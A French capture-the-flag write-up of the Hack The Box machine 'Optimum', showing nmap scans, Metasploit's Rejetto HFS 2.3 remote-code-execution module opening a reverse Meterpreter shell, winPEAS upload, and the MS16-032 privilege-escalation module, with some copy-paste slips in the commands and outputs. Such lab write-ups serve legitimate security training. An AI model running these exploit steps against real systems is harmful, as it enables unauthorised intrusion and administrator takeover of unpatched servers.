---
tags:
  - htb
  - cve
  - metasploit
  - web
  - privesc
title: Optimum
os: Windows
difficulty: Easy
date: 2025-11-16
status: terminé
draft: "false"
---
---
# Optimum

> [!summary] Résumé rapide  
> Optimum est une machine Facile de Hack The Box. Elle présente un serveur HTTP qui tourne sur une version obsolète qui permet à un attaquant de se connecter à la machine en tant qu'utilisateur. Enfin, le serveur n'ayant pas les dernières mises à jour de sécurité, un attaquant peut utiliser une vulnérabilité dans le service d'ouverture de session secondaire de Windows pour élever ses privilèges en tant qu'administrateur.

---

## 🟦 Informations générales

- **Nom de la machine :** Optimum
- **OS :** Windows
- **Difficulty :** Easy
- **Auteur :** ch4p
- **Date :** 16/11/2025
- **Statut :** En cours

---
## 🟦 1. Reconnaissance réseau


> [!info] 1.2 Nmap – Scan initial

```bash
nmap -p- 10.129.236.31 --min-rate 5000
```

**Services découverts :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 16:15 CET
Nmap scan report for 10.129.236.31
Host is up (0.060s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.83 seconds
```


> [!info] 1.3 Nmap – Scan complet

```bash
nmap -sVC -p80 10.169.236.31 -oN optimum.nmap
```

**Infos supplémentaires :**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 16:16 CET
Nmap scan report for 10.169.236.31
Host is up (0.00s latency).

PORT   STATE    SERVICE VERSION
80/tcp filtered http

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```

Il semble qu'un pare-feu nous empêche de récupérer plus d'informations.

---
## 🟦 2. Analyse des services

### 🌐 HTTP / Web (si présent)


![[Pasted image 20251116162313.png]]

Nous sommes face à un serveur HttpFileServer/2.3

Une recherche rapide avec `searchsploit` nous informe qu'il existe une RCE sur cette version :

![[Pasted image 20251116162605.png]]

**Technos détectées :**  
-  HttpFileServer/2.3

---

## 🟦 3. Points d’entrée potentiels

-  Exploitation du service HttpFileServer/2.3 vulnérable

---

## 🟦 4. Exploitation

> [!tip] 4.1 PoC

On va utiliser `msfconsole` (Metasploit) afin d'exploiter la cible.

```bash
msf > seach HttpFileServer
msf > use exploit/windows/http/rejetto_hfs_exec
```

Configuration de l'exploit : (`options` pour voir les options)

```bash
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0                     LHOST => 10.10.14.66

msf exploit(windows/http/rejetto_hfs_exec) > set LHOST tun0                     SRVPORT => 11337

msf exploit(windows/http/rejetto_hfs_exec) > set RHOST blue.htb                 RHOST => optimum.htb
```

> **Note**: Il m'a fallu changer le `SRVPORT` car le port 8080 est utilisé par Burp

**Résultat :**  

```bash
msf exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.66:4444
[*] Using URL: http://10.10.14.66:1337/SBmExNwO5
[*] Server started.
---
<snip>
---
[*] Meterpreter session 1 opened (10.10.14.66:4444 -> 10.129.236.31:49162) at 2025-11-16 16:31:10 +0100
[*] Server stopped.
```

![[Pasted image 20251116163519.png]]

**Accès obtenu :**  
- User : kostas
- Contexte :  meterpreter/shell

---

## 🟦 5. Post-exploitation / Énumération locale

> [!info] Windows

Depuis la console meterpreter, on peut utiliser la commande `upload` afin d'uploader winPeas

```bash
upload ~/Pentest/Tools/PEASS-ng/winPEAS/winPEASexe/winPEASx86.exe
```

On peut également utiliser un module de post exploitation de Metasploit, étant donné qu'on a une session meterpreter.

On commence par mettre en background notre session avec la commande `bg`. Puis on peut utiliser le module de reconnaissance :

```bash
msf > use post/multi/recon/local_exploit_suggester

msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1

msf post(multi/recon/local_exploit_suggester) > run
```

`session 1` correspond à l'ID de notre session meterpreter.

**Résultat** : Plusieurs exploits sont disponibles

![[Pasted image 20251116171008.png]]

---

## 🟦 6. Élévation de privilèges

### Méthode retenue :

Nous allons utiliser l'exploit d'élévation de privilèges MS16-032 ([CVE-2016-0099](https://www.cve.org/CVERecord?id=CVE-2016-0099)) :

```bash
msf > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

Comme précédemment, nous prenons soin de set les options `LHOST` et `session` :

```bash
> set LHOST tun0
LHOST => 10.10.14.66

> set session 1
session => 1
```

- Pourquoi ça marche :  Le serveur tourne sur une version non mise à jour.

**Contexte final :** administrator

---

## 🟦 7. Résumé final

> [!success] Ce que j’ai appris  
-  Utiliser Metasploit pour assister l'élévation de privilège
-  Énumérations sous Windows

> [!attention] Patterns utiles  
-  Recherche de vulnérabilités en post avec Metasploit quand on a une console meterpreter
-  Module `post/multi/recon/local_exploit_suggester`